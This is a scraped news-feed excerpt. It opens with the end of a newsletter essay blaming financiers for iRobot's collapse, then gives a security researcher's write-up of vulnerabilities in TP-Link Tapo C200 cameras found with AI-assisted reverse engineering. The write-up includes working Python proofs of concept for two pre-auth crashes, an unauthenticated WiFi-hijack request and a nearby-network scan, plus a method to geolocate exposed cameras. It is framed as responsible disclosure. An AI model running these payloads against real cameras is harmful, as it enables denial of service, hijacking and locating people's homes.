href="https://www.bloomberg.com/news/articles/2025-12-16/carlyle-loses-over-100-million-on-soured-loan-to-roomba-maker" rel="">had lent</a><span> $200 million to iRobot to help the company get through the merger, and when that merger fell apart, it </span><a href="https://www.reuters.com/technology/amazons-abandoned-acquisition-leaves-irobot-carlyle-debt-straightjacket-2024-01-31/" rel="">ended</a><span> up taking nearly 80% of the breakup fee. </span></p><p>Could iRobot have continued as a viable firm? Well Angle publicly said it could, and iRobot executives almost certainly framed it that way to the FTC. Had iRobot truly been insolvent, they could have used a legal argument known as a “failing firm” defense, meaning explaining to regulators they would have gone out of business without a merger. But that would have likely caused Amazon to reduce the price it would have paid to shareholders, including, presumably, the golden parachutes going to the executive team of iRobot. </p><p>By 2025, the board likely concluded that iRobot could never get the high returns on capital that its board of financiers expected. The losing battle with Red Mountain Capital in 2016 had taught Angle not to build robots and innovative products, but to asset strip. When his company actually had to once again build, they threw in the towel. Carlyle sold the remaining debt at a loss to Shenzhen, which then seized the remaining branding and intellectual property. </p><p>There’s an interesting question about whether Shenzhen should be allowed to acquire iRobot, but which involves not only antitrust, but foreign acquisitions and national security. There is a government body that makes such decisions. It’s called the Committee on Foreign Investment in the U.S., or CFIUS. And CFIUS, which presumably allowed this acquistion, is led by… Treasury Secretary Scott Bessent. </p><p>In other words, the story here is Wall Street destroying a promising robotics enterprise through financial engineering, aiding the Chinese in the process, and then demanding a bailout via amnesty from antitrust laws so that shareholders wouldn’t lose any money, while refusing to acknowledge that a key Trump ally of Wall Street facilitated the transfer of the firm to China.</p><p>Of course, this bad faith is routine. None of the critics of antitrust enforcement, including Furman, care if U.S. technology flows to China or if companies fail. They in fact celebrated offshoring when it happened to 90,000 manufacturing plants from 2000 onward, and they often make the point that failure is part of capitalism. But when it comes to one specific company, where they can cherry pick information to make a case against antitrust, well then, all of a sudden iRobot’s bankruptcy is a disaster. </p><p>All that said, there is an important lesson here for anti-monopolists. Antitrust is a useful tool, but it cannot substitute for a broader national economic development strategy. Right now, America, through a whole set of policy choices, from bailouts to government contracts to pro-speculation regulations to attacks on the rights of labor and creators, ensures that financiers get an unfairly high return on capital. We can see the consequences in everything from the collapse of iRobot to the destruction of America’s cattle herd to the erosion of capacity in Hollywood to the financialized AI data center build-out. The business of America right now is extraction, not creation.</p><p>To reverse this strategy, a more assertive antitrust regime is necessary, but it’s not enough. We also have to reduce the many other public levers of support for elevated returns on capital. Only then will it make sense for companies like iRobot to invest in robots instead of share buybacks. </p><p><span>Thanks for reading! Your tips make this newsletter what it is, so please send me tips on weird monopolies, stories I’ve missed, or other thoughts. And if you liked this issue of BIG, you can sign up </span><a href="http://email.mg1.substack.com/c/eJxVUMFuwyAM_ZpwjIAmYT34UHXtb0QEnBSNQARmVf5-pN1hkyzberae37PRhEtMOxBmYiVjGp0FZoEradTEXB7nhLhq54FtZfLOaHIxHFtC9LJjDzhxNUs7nKTlnGsthRKDmj-s4dIYO0i2xUyjLtZhMAj4jWmPAZmHB9GWm9OlkfcaqybKFL3H1OYyZdLmqzVxraMn-togcyC5OPNzzT3ve9WKVnS3y5WL4a54d1PdZ9PxdRH_CFiCX946XA4vL7TaGWtdS3C0jxj05NECpYKM3v94Cad9Qwj4zB6JML3Bw74chFCsHrKxcgb4o_8H-RJ1Kg" rel="">here</a><span> for more issues, a newsletter on how to restore fair commerce, innovation, and democracy. Consider becoming a </span><a href="https://email.mg1.substack.com/c/eJxVUMtuwyAQ_JpwtABjEw4ceulvIB6Lg4rBgrUq_31J0kO7Wmk1-xrNeIuw1XZphI7kqB0NXgfoAt89AyI0cnZoJgVNgqaSe-lI6iY2gN2mrMlxupy8xVTLc4uxhQvy0DZKpyjQIL31CqigggOPQYWBIqg3lz1DguJB15Ivc9gUSNYPxKPf5o8b_xy5W8SONWdoUz9dR-u_Jl_3MXpC35IDkjSnnI2Y6cwkZROfhIwuSrXauC7e2_u0rNhtvJaboPvG_v0iTf9SjOH21PXqDmlm1P0sCS8DxboMQWM7geDbsJcHZoMCbRgZjEXN1nmVchaci5W9VQ5bxEzlXVFFBm2o46roP8J-AJJ0hnE" rel="">paying subscriber</a><span> to support this work, or if you are a paying subscriber, giving a </span><a href="https://email.mg1.substack.com/c/eJxVUEtuxSAMPE1YRnwSSBYsKlW9BiJgUlQCETiqcvvy3uuitSxZ9tgezTiLsJd6a4SG5CwNDd4n6AzfLQEiVHI1qCZ6Tbymiju1kdhMqACHjUmT89pSdBZjyY8txmY-kU_tOZOU-bB5urhl9ouc-RomtnoXpOX0xWUvHyE70CWn25w2epL0J-LZBvE28I-eh0VsWFKCOrZra2jd1-jK0aFH62rcYBB9U-4x4CDesV5AouaUsx6CCqYoG_k4qbAFtUob5OycXcZZYrPhnoeJHjv795xU_cvZwf0h9DntWk2vx5Uj3gay3RJ4_STEl4NPU8wOGWp31huLmkkhlRIT55NkL9ndp0lQtax0JZ3Wl36V9R-lPyvjiqk" rel="">gift subscription</a><span> to a friend, colleague, or family member. If you really liked it, read my book, </span><a href="https://www.simonandschuster.com/books/Goliath/Matt-Stoller/9781501183089" rel="">Goliath: The 100-Year War Between Monopoly Power and Democracy</a><span>.</span></p><p>cheers,</p><p>Matt Stoller</p></div></article></div><div><div id="discussion"><h4>Discussion about this post</h4></div><div><h3>Ready for more?</h3></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[TP-Link Tapo C200: Hardcoded Keys, Buffer Overflows and Privacy (317 pts)]]></title>
            <link>https://www.evilsocket.net/2025/12/18/TP-Link-Tapo-C200-Hardcoded-Keys-Buffer-Overflows-and-Privacy-in-the-Era-of-AI-Assisted-Reverse-Engineering/</link>
            <guid>46329038</guid>
            <pubDate>Fri, 19 Dec 2025 18:19:32 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.evilsocket.net/2025/12/18/TP-Link-Tapo-C200-Hardcoded-Keys-Buffer-Overflows-and-Privacy-in-the-Era-of-AI-Assisted-Reverse-Engineering/">https://www.evilsocket.net/2025/12/18/TP-Link-Tapo-C200-Hardcoded-Keys-Buffer-Overflows-and-Privacy-in-the-Era-of-AI-Assisted-Reverse-Engineering/</a>, See on <a href="https://news.ycombinator.com/item?id=46329038">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    <p>Hi friends and welcome to the last post for this year! Whenever someone asks me how to get started with reverse engineering, I always give the same advice: buy the cheapest IP camera you can find. These devices are self-contained little ecosystems - they have firmware you can extract, network protocols you can sniff, and mobile apps you can decompile. Chances are, you’ll find something interesting. At worst, you’ll learn a lot about assembly and embedded systems. At best, you’ll find some juicy vulnerability and maybe learn how to exploit it!</p>
<p><img src="https://www.evilsocket.net/images/2025/tapo/header.jpg" alt="tp-link tapo c200"></p>
<p>I own several TP-Link Tapo C200 cameras myself. They’re cheap (less than 20 EUR from Italy), surprisingly stable, and I genuinely like them - they just work. One weekend, I decided just for fun to take my own advice. The Tapo C200 has been around for a while and has had <a target="_blank" rel="noopener" href="https://www.cvedetails.com/vulnerability-list/vendor_id-11936/product_id-83493/Tp-link-Tapo-C200-Firmware.html">a few CVEs</a> discovered and more or less patched over the years, so I honestly wasn’t expecting to find much in the latest firmware. However, I wanted to use this chance to perform some <strong>AI assisted reverse engineering</strong> and test whether I could still find anything at all.</p>
<p>I documented the entire process live on <a target="_blank" rel="noopener" href="https://discord.com/channels/1100085665766572142/1396102661257957396">Arcadia</a> - my thought process, the dead ends, the AI prompts that worked and the ones that didn’t. If you want the raw, unfiltered version with screenshots and videos of things crashing, go check that out.</p>
<p>This post is the cleaned-up version of that journey, where I wanted to show how I approach firmware analysis these days, now that we have AI. You will notice that in several instances I will be particularly lazy and delegate to AI things I could have done manually and/or inferred myself after some more work. Keep in mind that while I <em>am</em> generally lazy, this was also an experiment in integrating and documenting how effective AI can be for security research and reverse engineering, and especially in making them accessible to less experienced/sophisticated researchers/attackers.</p>
<p>What started as a lazy weekend project turned into finding a few security vulnerabilities that affect about <a target="_blank" rel="noopener" href="https://www.zoomeye.ai/searchResult?q=IlRQUkktREVWSUNFIg==">25,000 of these devices directly exposed on the internet</a>.</p>
<p><img src="https://www.evilsocket.net/images/2025/tapo/map.png" alt="tapo c200 devices map"></p>
<h2 id="Getting-the-Firmware"><a href="#Getting-the-Firmware" title="Getting the Firmware"></a>Getting the Firmware</h2><p><small>
<h3>Tools</h3>
<ul>
    <li>
        Old friend <a href="https://java-decompiler.github.io/" target="_blank">JD-GUI</a> to reverse the Android app and get a sense of things
    </li>
    <li>
        <a href="https://aws.amazon.com/cli/" target="_blank">The AWS CLI</a> to download the firmware image.
    </li>
    <li>
        <a href="https://github.com/ReFirmLabs/binwalk" target="_blank">binwalk</a> for firmware inspection.
    </li>
    <li>
        <a href="https://grok.com/" target="_blank">Grok</a> to give a quick AI assisted look into prior research.   
    </li>
</ul>
</small></p><p>The first step is always obtaining the firmware binary file and this time it was super easy! After some <a href="https://www.evilsocket.net/2017/04/27/Android-Applications-Reversing-101/">basic reversing</a> of the <a target="_blank" rel="noopener" href="https://play.google.com/store/apps/details?id=com.tplink.iot&amp;hl=it">Tapo Android app</a>, I found out that TP-Link have their entire firmware repository in an open S3 bucket. No authentication required. So, you can list and download every version of every firmware they’ve ever released for any device they ever produced:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>$ aws s3 ls s3://download.tplinkcloud.com/ --no-sign-request --recursive</span><br></pre></td></tr></tbody></table></figure>

<p><a href="https://www.evilsocket.net/images/2025/tapo/bucket_contents.txt">The entire output is here, for the curious</a>. This provides access to the firmware image of every TP-Link device - routers, cameras, smart plugs, you name it. A reverse engineer’s candy store.</p>
<p>I grabbed version <strong>1.4.2 Build 250313 Rel.40499n</strong> for the C200 (Hardware Revision 3), named <code>Tapo_C200v3_en_1.4.2_Build_250313_Rel.40499n_up_boot-signed_1747894968535.bin</code>, and started poking around. However, the first attempt at identifying its format via binwalk was not successful, indicating that some sort of encryption or obfuscation was in place.</p>
<p>And here is where I started using AI. I used Grok to <a target="_blank" rel="noopener" href="https://x.com/i/grok/share/t9RzvgCRwIluVGnXMu39VVxDx">do some deep research</a> on how to decrypt the firmware for these cameras. Since I knew other hackers worked on this before, I delegated searching into hundreds of relevant web pages to the AI:</p>
<p><img src="https://www.evilsocket.net/images/2025/tapo/grok-fw.png" alt="grok"></p>
<h3 id="Decrypting-the-Firmware"><a href="#Decrypting-the-Firmware" title="Decrypting the Firmware"></a>Decrypting the Firmware</h3><p><small>
<h3>Tools</h3>
<ul>
    <li>
        The <a href="https://github.com/robbins/tp-link-decrypt" target="_blank">tp-link-decrypt</a> tool to decrypt the firmware image.
    </li>
    <li>
        <a href="https://github.com/ReFirmLabs/binwalk" target="_blank">binwalk</a> for firmware inspection.
    </li>
</ul>
</small></p><p>Thanks to Grok, the <a target="_blank" rel="noopener" href="https://github.com/robbins/tp-link-decrypt">tp-link-decrypt</a> tool and the fact that every firmware image for every device seems to be encrypted the same exact way, we can now decrypt the firmware. The tool extracts RSA keys from TP-Link’s own GPL code releases - they publish the decryption keys themselves as part of their open source obligations.</p>
<p>Credits to @watchfulip for the <a target="_blank" rel="noopener" href="https://watchfulip.github.io/28-12-24/tp-link_c210_v2.html">original extensive TP-Link firmware research</a> and @tangrs for <a target="_blank" rel="noopener" href="https://blog.tangrs.id.au/2025/09/22/decrypting-tplink-smart-switch-firmware/">finding that the relevant binaries are published in TP-Link GPL code dumps and how to extract keys from them</a>.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></pre></td><td><pre><span>$ git <span>clone</span> https://github.com/robbins/tp-link-decrypt</span><br><span>$ <span>cd</span> tp-link-decrypt</span><br><span>$ ./preinstall.sh        </span><br><span>$ ./extract_keys.sh      </span><br><span>$ make</span><br><span>$ bin/tp-link-decrypt Tapo_C200_firmware.bin</span><br></pre></td></tr></tbody></table></figure>

<p>After decryption, the firmware revealed a fairly standard structure: a bootloader, a kernel, and a SquashFS root filesystem.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>$ binwalk -e Tapo_C200_v3_1.4.2_decrypted.bin</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://www.evilsocket.net/images/2025/tapo/binwalk.jpg" alt="binwalk"></p>
<h2 id="Hunting-for-Bugs"><a href="#Hunting-for-Bugs" title="Hunting for Bugs"></a>Hunting for Bugs</h2><p><small>
<h3>Tools</h3>
<ul>
    <li>
        <a href="https://github.com/NationalSecurityAgency/ghidra" target="_blank">Ghidra</a> to decompile and understand the MIPS binaries
    </li>
    <li>
        <a href="https://github.com/LaurieWired/GhidraMCP" target="_blank">GhidraMCP</a> to let an AI connect to my running Ghidra instance and support me in the process.
    </li>
    <li>
        <a href="https://github.com/cline/cline" target="_blank">
            Cline
        </a> to ask AI to explore the filesystem and find interesting components.
    </li>
    <li>
        A mix of <a href="https://claude.ai/" target="_blank">Anthropic's Opus and Sonnet 4</a>.
    </li>
</ul>
</small></p><p>Once extracted, I used AI and Cline to explore the filesystem in search of which components handle the discovery protocol, camera web API, video streaming, etc all discovered earlier while reversing the Android app.</p>
<blockquote><p lang="en" dir="ltr">Claude Opus 4: "this is the firmware of an ipcam, i'm trying to find where the webapp that serves the API is managed" <a target="_blank" rel="noopener" href="https://t.co/NrgtKGUD8h">pic.twitter.com/NrgtKGUD8h</a></p>— Simone Margaritelli (@evilsocket) <a target="_blank" rel="noopener" href="https://twitter.com/evilsocket/status/1946238860007973282?ref_src=twsrc%5Etfw">July 18, 2025</a></blockquote> 

<p>Loading Ghidra and giving a quick look at the <code>tp_manage</code> binary, revealed the first interesting thing:</p>
<p><img src="https://www.evilsocket.net/images/2025/tapo/certs.webp" alt="tp_manage"></p>
<p>This private key is not generated at boot. Similarly to <a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2025-1099">CVE-2025-1099 for the C500</a>, the C200 embeds in its firmware the private key that serves the SSL for a few APIs. If you’re on the same network as a camera, you can MitM and decrypt their HTTPS traffic with keys you extracted from the firmware image - without ever touching the hardware. For a <em>security</em> camera streaming video of people’s homes, this is… not ideal.</p>
<p>I kept loading the other interesting binaries and exploring them in Ghidra using AI to quickly get a sense of the main features and possible entry points for an attacker.</p>
<p><strong>Asking AI to explain a function</strong> and its relation to the other functions proved to be very useful for instance to understand encryption / obfuscation routines and network protocol handlers. This allows you to go from here:</p>
<p><img src="https://www.evilsocket.net/images/2025/tapo/decompiled.webp" alt="decompiled"></p>
<p>To a higher level understanding that the AI can provide:</p>
<p><img src="https://www.evilsocket.net/images/2025/tapo/udpcrc.webp" alt="udp crc"></p>
<p>Another technique I found particularly effective is asking the AI to analyze a given function of interest and <strong>rename its variables and parameters to something meaningful based on context</strong>. Then do the same for the functions it calls, recursively following the branches you’re interested in. After a few iterations, what started as <code>FUN_0042eb7c(undefined2 *param_1, undefined4 param_2, int param_3)</code> becomes <code>handleConnectAp(connection *conn, int flags, json *params)</code> - and suddenly the decompiled code reads almost like the original source. </p>
<p>This iterative refinement approach, which I find a great example of human-AI collaboration where neither alone would be as efficient, is how I mapped most of the HTTP handlers, discovery protocol, and so on. What follows is the bottom line of my findings. For more details on the process, refer to <a target="_blank" rel="noopener" href="https://discord.com/channels/1100085665766572142/1396102661257957396">the original Discord thread</a>.</p>
<p>As a side note, I did not investigate (much) the exploitability of the following bugs to achieve code execution, mostly because I’m not familiar with MIPS, and it was not my intent. You can however do it relatively easily once <a target="_blank" rel="noopener" href="https://www.hacefresko.com/posts/tp-link-tapo-c200-unauthenticated-rce">obtained a shell via physical access</a>, due to the presence of the <code>/bin/gdbserver</code> binary in the firmware.</p>
<h2 id="Bug-1-Pre-Auth-ONVIF-SOAP-XML-Parser-Memory-Overflow"><a href="#Bug-1-Pre-Auth-ONVIF-SOAP-XML-Parser-Memory-Overflow" title="Bug 1: Pre-Auth ONVIF SOAP XML Parser Memory Overflow"></a>Bug 1: Pre-Auth ONVIF SOAP XML Parser Memory Overflow</h2><p>The Tapo C200 exposes an ONVIF service via the <code>/bin/main</code> server listening on port 2020 for interoperability with standard video management systems. The problem is in how it parses SOAP XML requests.</p>
<p>When processing XML elements, the parser (<code>soap_parse_and_validate_request</code> at <code>0x0045ae8c</code>) calls <code>ds_parse</code> without any bounds checking on the number of elements or total memory allocation. Send it enough XML elements, and you’ll overflow allocated memory.</p>
<p>Here’s the PoC:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br></pre></td><td><pre><span></span><br><span><span>import</span> urllib.request</span><br><span><span>import</span> sys</span><br><span></span><br><span>TARGET = sys.argv[<span>1</span>]</span><br><span>ONVIF_PORT = <span>2020</span></span><br><span></span><br><span></span><br><span>params = <span>''</span>.join([<span>f'&lt;SimpleItem Name="Param<span>{i}</span>" Value="<span>{<span>"X"</span> * <span>100</span>}</span>"/&gt;'</span> </span><br><span>                  <span>for</span> i <span>in</span> <span>range</span>(<span>100000</span>)])</span><br><span></span><br><span>body = <span>f'''&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span><span>&lt;soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"&gt;</span></span><br><span><span>&lt;soap:Body&gt;</span></span><br><span><span>&lt;CreateRules xmlns="http://www.onvif.org/ver20/analytics/wsdl"&gt;</span></span><br><span><span>&lt;ConfigurationToken&gt;test&lt;/ConfigurationToken&gt;</span></span><br><span><span>&lt;Rule&gt;</span></span><br><span><span>&lt;Name&gt;TestRule&lt;/Name&gt;</span></span><br><span><span>&lt;Type&gt;tt:CellMotionDetector&lt;/Type&gt;</span></span><br><span><span>&lt;Parameters&gt;<span>{params}</span>&lt;/Parameters&gt;</span></span><br><span><span>&lt;/Rule&gt;</span></span><br><span><span>&lt;/CreateRules&gt;</span></span><br><span><span>&lt;/soap:Body&gt;</span></span><br><span><span>&lt;/soap:Envelope&gt;'''</span></span><br><span></span><br><span>req = urllib.request.Request(<span>f"http://<span>{TARGET}</span>:<span>{ONVIF_PORT}</span>/onvif/service"</span>, </span><br><span>                             data=body.encode(<span>'utf-8'</span>))</span><br><span>req.add_header(<span>'Content-Type'</span>, <span>'application/soap+xml'</span>)</span><br><span>urllib.request.urlopen(req, timeout=<span>30</span>)</span><br></pre></td></tr></tbody></table></figure>

<p>Send this, and the camera crashes, requiring a power cycle to recover.</p>
<center>
<blockquote data-media-max-width="560"><p lang="zxx" dir="ltr"><a target="_blank" rel="noopener" href="https://t.co/JQ64e9KAJp">pic.twitter.com/JQ64e9KAJp</a></p>— Simone Margaritelli (@evilsocket) <a target="_blank" rel="noopener" href="https://twitter.com/evilsocket/status/1946705477745733940?ref_src=twsrc%5Etfw">July 19, 2025</a></blockquote> 
</center>

<h2 id="Bug-2-Pre-Auth-HTTPS-Content-Length-Integer-Overflow"><a href="#Bug-2-Pre-Auth-HTTPS-Content-Length-Integer-Overflow" title="Bug 2: Pre-Auth HTTPS Content-Length Integer Overflow"></a>Bug 2: Pre-Auth HTTPS Content-Length Integer Overflow</h2><p>The HTTPS server routine running on port 443 has a classic integer overflow in its <code>Content-Length</code> header parsing. The vulnerable function at <code>0x004bd054</code> does this:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br></pre></td><td><pre><span>iVar1 = atoi(value);</span><br><span>param_1-&gt;content_length = iVar1;</span><br></pre></td></tr></tbody></table></figure>

<p>That’s it. No bounds checking. No validation. Just raw <code>atoi()</code> on user input.</p>
<p>On a 32-bit system, <code>atoi("4294967295")</code> causes integer overflow, resulting in undefined behavior. In this case, the camera crashes:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></pre></td><td><pre><span></span><br><span><span>import</span> socket</span><br><span><span>import</span> ssl</span><br><span><span>import</span> sys</span><br><span></span><br><span>TARGET = sys.argv[<span>1</span>]</span><br><span></span><br><span>request = <span>f"""POST / HTTP/1.1\r</span></span><br><span><span>Host: <span>{TARGET}</span>\r</span></span><br><span><span>Content-Length: 4294967295\r</span></span><br><span><span>Content-Type: application/octet-stream\r</span></span><br><span><span>Connection: close\r</span></span><br><span><span>\r</span></span><br><span><span>AAAA"""</span></span><br><span></span><br><span>context = ssl.create_default_context()</span><br><span>context.check_hostname = <span>False</span></span><br><span>context.verify_mode = ssl.CERT_NONE</span><br><span></span><br><span>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span>ssl_sock = context.wrap_socket(sock, server_hostname=TARGET)</span><br><span>ssl_sock.connect((TARGET, <span>443</span>))</span><br><span>ssl_sock.send(request.encode())</span><br></pre></td></tr></tbody></table></figure>

<center>
<blockquote data-media-max-width="560"><p lang="en" dir="ltr">And two <a target="_blank" rel="noopener" href="https://t.co/tt7eL7MA27">pic.twitter.com/tt7eL7MA27</a></p>— Simone Margaritelli (@evilsocket) <a target="_blank" rel="noopener" href="https://twitter.com/evilsocket/status/1946706143805387252?ref_src=twsrc%5Etfw">July 19, 2025</a></blockquote> 
</center>

<p>Another crash 💪</p>
<h2 id="Bug-3-Pre-Auth-WiFi-Hijacking"><a href="#Bug-3-Pre-Auth-WiFi-Hijacking" title="Bug 3: Pre-Auth WiFi Hijacking"></a>Bug 3: Pre-Auth WiFi Hijacking</h2><p>The camera exposes an API endpoint called <code>connectAp</code> that’s used during initial setup to configure WiFi. The problem? It’s accessible <strong>without any authentication</strong>. Even after the camera is fully set up and connected to your network.</p>
<p>The vulnerable handler at <code>0x0042eb7c</code> processes the request without any auth checks:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></pre></td><td><pre><span><span><span>void</span> <span>connectApHandler</span><span>(undefined2 *param_1,undefined4 param_2,<span>int</span> json_params)</span></span></span><br><span><span></span>{</span><br><span>    </span><br><span>    jso_add_string(iVar3,<span>"method"</span>,<span>"connectAp"</span>);</span><br><span>    jso_obj_add(iVar3,<span>"params"</span>,iVar2);</span><br><span>    iVar1 = ds_tapo_handle(param_1);</span><br><span>}</span><br></pre></td></tr></tbody></table></figure>

<center>
<blockquote data-media-max-width="560"><p lang="en" dir="ltr">And three! 🚀 <a target="_blank" rel="noopener" href="https://t.co/2GZiG4bTm0">pic.twitter.com/2GZiG4bTm0</a></p>— Simone Margaritelli (@evilsocket) <a target="_blank" rel="noopener" href="https://twitter.com/evilsocket/status/1947620181871677492?ref_src=twsrc%5Etfw">July 22, 2025</a></blockquote> 
</center>

<p>The exploit is trivial:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></pre></td><td><pre><span></span><br><span><span>import</span> urllib.request</span><br><span><span>import</span> ssl</span><br><span><span>import</span> sys</span><br><span></span><br><span>TARGET = sys.argv[<span>1</span>]</span><br><span></span><br><span></span><br><span>payload = <span>'{"method":"connectAp","params":{"onboarding":{"connect":{"ssid":"EVIL_NETWORK","bssid":"11:11:11:11:11:11","auth":3,"encryption":2,"rssi":3,"password":"hacked","pwd_encrypted":0}}}}'</span></span><br><span></span><br><span>context = ssl.create_default_context()</span><br><span>context.check_hostname = <span>False</span>  </span><br><span>context.verify_mode = ssl.CERT_NONE</span><br><span></span><br><span>req = urllib.request.Request(<span>f"https://<span>{TARGET}</span>/"</span>, data=payload.encode(<span>'utf-8'</span>))</span><br><span>req.add_header(<span>'Content-Type'</span>, <span>'application/json'</span>)</span><br><span>urllib.request.urlopen(req, context=context, timeout=<span>10</span>)</span><br></pre></td></tr></tbody></table></figure>

<p>This allows a remote attacker to:</p>
<ul>
<li><strong>Disconnect the camera</strong> from its legitimate network (DoS)</li>
</ul>
<p>If in WiFi range proximity:</p>
<ul>
<li><strong>Force it to connect to an attacker-controlled network</strong> (MitM)</li>
<li><strong>Intercept all video traffic</strong> once on the malicious network (not that we really needed this since the HTTPS private key is shared by all devices, as mentioned earlier XD)</li>
<li><strong>Maintain persistent access</strong> even if the owner changes their WiFi password</li>
</ul>
<h2 id="Bug-4-Pre-Auth-Nearby-WiFi-Network-Scanning"><a href="#Bug-4-Pre-Auth-Nearby-WiFi-Network-Scanning" title="Bug 4: Pre-Auth Nearby WiFi Network Scanning"></a>Bug 4: Pre-Auth Nearby WiFi Network Scanning</h2><p>Related to Bug 3, the <code>scanApList</code> method is also accessible without authentication - even when the device is not in onboarding mode. This endpoint returns a list of all WiFi networks visible to the camera:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></pre></td><td><pre><span></span><br><span><span>import</span> urllib.request</span><br><span><span>import</span> ssl</span><br><span><span>import</span> sys</span><br><span></span><br><span>TARGET = sys.argv[<span>1</span>]</span><br><span></span><br><span>payload = <span>'{"method":"scanApList","params":{}}'</span></span><br><span></span><br><span>context = ssl.create_default_context()</span><br><span>context.check_hostname = <span>False</span>  </span><br><span>context.verify_mode = ssl.CERT_NONE</span><br><span></span><br><span>req = urllib.request.Request(<span>f"https://<span>{TARGET}</span>/"</span>, data=payload.encode(<span>'utf-8'</span>))</span><br><span>req.add_header(<span>'Content-Type'</span>, <span>'application/json'</span>)</span><br><span>response = urllib.request.urlopen(req, context=context, timeout=<span>10</span>)</span><br><span>print(response.read().decode())</span><br></pre></td></tr></tbody></table></figure>

<p>A test on one of the devices exposed on the internet:</p>
<p><img src="https://www.evilsocket.net/images/2025/tapo/aps.png" alt="aps"></p>
<p>This is particularly concerning given the number of these devices exposed on the internet. An attacker can remotely enumerate WiFi networks in the camera’s vicinity, including:</p>
<ul>
<li><strong>SSIDs</strong> of nearby networks</li>
<li><strong>BSSIDs</strong> (MAC addresses of access points)</li>
<li><strong>Signal strength</strong> (useful for triangulation)</li>
<li><strong>Security configurations</strong></li>
</ul>
<p>Here’s where it gets worse: tools like <a target="_blank" rel="noopener" href="https://github.com/darkosancanin/apple_bssid_locator">apple_bssid_locator</a> can query Apple’s location services API with a BSSID and return precise GPS coordinates.</p>
<p>This means an attacker can:</p>
<ol>
<li>Find an exposed Tapo camera via services like ZoomEye, Shodan or similar indexes</li>
<li>Use <code>scanApList</code> to retrieve nearby WiFi BSSIDs</li>
<li>Query Apple’s location database with those BSSIDs</li>
<li><strong>Pinpoint the camera’s physical location to within a few meters</strong></li>
</ol>
<p>Remote attackers can not only see what WiFi networks exist around a camera - they can determine exactly where that camera (and by extension, the home or business it’s monitoring) is located on a map.</p>
<h2 id="Disclosure"><a href="#Disclosure" title="Disclosure"></a>Disclosure</h2><p>I’ve decided to follow the <a target="_blank" rel="noopener" href="https://projectzero.google/vulnerability-disclosure-policy.html">industry standard</a> <strong>90+30 days</strong> responsible disclosure process; here’s the timeline:</p>
<ul>
<li><strong>July 22, 2025</strong>: Sent initial report to TP-Link’s security team (<a href="https://www.evilsocket.net/cdn-cgi/l/email-protection#eec8cddfdfdbd5c8cddfdedfd5c8cdd7d7d5c8cd96d9dbd5c8cd96d9dcd5c8cddfdedbd5c8cd96d9dad5c8cddfdcdfd5c8cdd8dad5c8cd96d9dad5c8cddfdfdcd5c8cddadbd5c8cddfded6d5c8cddfdedbd5c8cd96d88bd5c8cd96d88cd5c8cd96dc8bd5c8cd96d8ddd5c8cd96d888d5c8cddfded7d5">security@tp-link.com</a>) with full technical details, PoC exploits and videos. All compiled according to <a target="_blank" rel="noopener" href="https://www.tp-link.com/en/press/security-advisory/">their guidelines</a>.</li>
<li><strong>July 22, 2025</strong>: Acknowledgment received.</li>
<li><strong>August 22, 2025</strong>: TP-Link confirms they’re still reviewing the report</li>
<li><strong>September 27, 2025</strong>: TP-Link responds and sets the timeline for the remediation patch to the end of November 2025.</li>
<li><strong>November 2025</strong>: Nothing happens.</li>
<li><strong>December 1, 2025</strong>: Sent follow up email, no response.</li>
<li><strong>December 4, 2025</strong>: Sent another follow up email, which TP-Link responds to, further postponing the patch to the following week.</li>
<li><strong>The following week</strong>: Nothing happens.</li>
<li><strong>December 19, 2025</strong>: Public disclosure <strong>after 150 days</strong>.</li>
</ul>
<p>The 90+30 period has long passed, so I decided to publish this writeup.</p>
<h2 id="Conflict-Of-Interest"><a href="#Conflict-Of-Interest" title="Conflict Of Interest"></a>Conflict Of Interest</h2><p><a target="_blank" rel="noopener" href="https://www.tp-link.com/us/press/news/21730/">As of April 25, TP-Link is a CVE Numbering Authority (CNA)</a>. This means they have the authority to assign CVE identifiers for vulnerabilities in their own products - at least for the ones reported directly to them. And they <a target="_blank" rel="noopener" href="https://www.tp-link.com/it/press/security-advisory/">actively encourage responsible disclosure directly to their security team</a>, which means they control a considerable pipeline of vulnerability reports.</p>
